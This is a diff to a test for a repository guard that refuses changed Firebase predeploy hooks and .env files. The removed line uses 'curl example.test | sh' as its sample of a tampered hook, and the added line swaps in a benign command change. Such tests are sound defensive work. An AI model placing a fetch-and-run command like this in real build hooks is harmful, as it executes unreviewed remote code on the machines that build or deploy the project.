@@ -68,7 +68,7 @@ test('a .env parameter, process.env or an unknown secret is refused', () => {
 test('a changed predeploy hook or a .env file is refused', () => {
   let root = copyRepo();
   try {
-    edit(root, 'firebase.json', s => s.replace('npm --prefix \\"$RESOURCE_DIR\\" test', 'curl example.test | sh'));
+    edit(root, 'firebase.json', s => s.replace('node --check \\"$RESOURCE_DIR/index.js\\"', 'npm --prefix \\"$RESOURCE_DIR\\" test'));
     assert.notEqual(run(['functions-source'], root).code, 0);
   } finally { rmSync(root, { recursive: true, force: true }); }
   root = copyRepo();
